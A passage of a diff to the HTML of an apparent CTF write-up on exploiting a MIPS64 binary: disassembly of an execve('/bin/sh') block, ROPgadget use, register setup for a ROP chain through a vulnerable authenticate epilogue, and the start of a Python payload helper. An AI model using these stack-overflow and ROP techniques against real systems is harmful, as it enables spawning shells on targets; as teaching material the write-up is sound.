+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004110</span>                 nop                      <span style="color:#6272a4">; nop
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004114</span>                 lw      $v0, <span style="color:#bd93f9">0xC</span>($fp)    <span style="color:#6272a4">; Load Word
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004118</span>                 move    $a0, $v0         <span style="color:#6272a4">; fd
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">000000012000411</span>C                 dla     $v0, close       <span style="color:#6272a4">; Load 64-bit address
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004120</span>                 move    $t9, $v0         <span style="color:#6272a4">; close
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004124</span>                 jalr    $t9 <span style="color:#6272a4">; close      ; Jump And Link Register
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004128</span>                 nop                      <span style="color:#6272a4">; nop
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">000000012000412</span>C                 ld      $v0, <span style="color:#bd93f9">0x1010</span>($fp)  <span style="color:#6272a4">; Load Doubleword
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004130</span>                 daddiu  $v1, $fp, <span style="color:#bd93f9">0x1010</span>  <span style="color:#6272a4">; Doubleword Add Immediate Unsigned
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004134</span>                 move    $a2, $zero       <span style="color:#6272a4">; envp
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004138</span>                 move    $a1, $v1         <span style="color:#6272a4">; argv
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">000000012000413</span>C                 move    $a0, $v0         <span style="color:#6272a4">; path
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004140</span>                 dla     $v0, execve      <span style="color:#6272a4">; Load 64-bit address
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004144</span>                 move    $t9, $v0         <span style="color:#6272a4">; execve
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004148</span>                 jalr    $t9 <span style="color:#6272a4">; execve     ; Jump And Link Register
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">000000012000414</span>C                 nop
+<span style="color:#6272a4">; skip
+</span></code></pre></div><p>It&rsquo;s a part of the <code>ip</code> function, called when we trigger the &ldquo;Show network interfaces&rdquo; option. When I saw at the begin of the function, some local variables like a pointer to the <code>&quot;/bin/sh&quot;</code> string and a block of code which executes especially <code>execve(&quot;/bin/sh&quot;, &quot;-c&quot;, NULL)</code>. Since I discovered this basic block I thought I should have to jump around it with the right stackframe. But after a few hours I figured out it wasn&rsquo;t possible :(. And figured out too that the <code>NULL</code> byte isn&rsquo;t a badchar :).</p>
 <h4 id="ropchain">ROPchain</h4>
 <p>Now we&rsquo;re able to craft a ropchain with only one badchar: &ldquo;\n&rdquo;. To do so we can launch <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> to find some suitable gadgets:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ROPgadget --binary mipsy &gt; gadgets
@@ -446,14 +446,14 @@ I discovered during the reverse engineering part an interesting snippet of code:
 <p>And that&rsquo;s why it&rsquo;s too hard to find automatically gadgets for mips binaries. But fortunately, ROPgadgets finds a a great amount of gadgets which helps us a lot.</p>
 <p>The exploitation would be for me to jmp to the execve&rsquo;s call with the right context.
 The code looks like such:</p>
-<pre><code class="language-x86asm" data-lang="x86asm">.text:0000000120004134                 move    $a2, $zero       ; envp
-.text:0000000120004138                 move    $a1, $v1         ; argv
-.text:000000012000413C                 move    $a0, $v0         ; path
-.text:0000000120004140                 dla     $v0, execve      ; Load 64-bit address
-.text:0000000120004144                 move    $t9, $v0
-.text:0000000120004148                 jalr    $t9 ; execve     ; Jump And Link Register
-.text:000000012000414C                 nop
-</code></pre><p>To do so we have to:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#8be9fd;font-style:italic">.text:</span>0000000120004134                 <span style="color:#50fa7b">move</span>    $a2, $zero       <span style="color:#6272a4">; envp
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004138</span>                 move    $a1, $v1         <span style="color:#6272a4">; argv
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">000000012000413</span>C                 move    $a0, $v0         <span style="color:#6272a4">; path
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004140</span>                 dla     $v0, execve      <span style="color:#6272a4">; Load 64-bit address
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004144</span>                 move    $t9, $v0         <span style="color:#6272a4">; execve
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004148</span>                 jalr    $t9 <span style="color:#6272a4">; execve     ; Jump And Link Register
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">000000012000414</span>C                 nop
+</code></pre></div><p>To do so we have to:</p>
 <ul>
 <li>set <code>$v1</code> register to <code>NULL</code></li>
 <li>set <code>$v0</code> register to a pointer to <code>/bin/sh</code></li>
@@ -473,15 +473,15 @@ The code looks like such:</p>
 [skip]
 </code></pre><p>It&rsquo;s a gadget a bit more hard to understand but we just have to take care to: do not write <code>$v0</code>, control the value of <code>$v9</code> to jump on, control the value of <code>$v1</code>. And so this gadget is a good candidate.</p>
 <p>Finally we need to control the value of the <code>$gp</code> register but to achieve that we do not need to use a gadget, because we already control it thanks to the vuln epilogue:</p>
-<pre><code class="language-x86asm" data-lang="x86asm">.text:00000001200046A4 loc_1200046A4:                           # CODE XREF: authenticate+104↑j
-.text:00000001200046A4                 move    $sp, $fp
-.text:00000001200046A8                 ld      $ra, 0x90+ret_addr($sp)  # Load Doubleword
-.text:00000001200046AC                 ld      $fp, 0x90+var_10($sp)  # Load Doubleword
-.text:00000001200046B0                 ld      $gp, 0x90+var_18($sp)  # Load Doubleword
-.text:00000001200046B4                 daddiu  $sp, 0x90        # Doubleword Add Immediate Unsigned
-.text:00000001200046B8                 jr      $ra              # Jump Register
-.text:00000001200046BC                 nop
-</code></pre><h2 id="put-all-together">Put all together</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#8be9fd;font-style:italic">.text:</span>00000001200046<span style="color:#50fa7b">A4</span> loc_1200046A4:                           <span style="color:#6272a4"># CODE XREF: authenticate+104↑j
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200046</span>A4                 move    $sp, $fp         <span style="color:#6272a4"># _
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200046</span>A8                 ld      $ra, <span style="color:#bd93f9">0x90</span>+ret_addr($sp)  <span style="color:#6272a4"># Load Doubleword
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200046</span>AC                 ld      $fp, <span style="color:#bd93f9">0x90</span>+var_10($sp)  <span style="color:#6272a4"># Load Doubleword
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200046</span>B0                 ld      $gp, <span style="color:#bd93f9">0x90</span>+var_18($sp)  <span style="color:#6272a4"># Load Doubleword
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200046</span>B4                 daddiu  $sp, <span style="color:#bd93f9">0x90</span>        <span style="color:#6272a4"># Doubleword Add Immediate Unsigned
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200046</span>B8                 jr      $ra              <span style="color:#6272a4"># Jump Register
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200046</span>BC                 nop
+</code></pre></div><h2 id="put-all-together">Put all together</h2>
 <p>For the pruposes of mips exploitation I developped a small function in python which inserts automatically a value at an arbitrary offset.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">make_pld</span>(s, val, pos):
     <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(s) <span style="color:#ff79c6">==</span> pos:
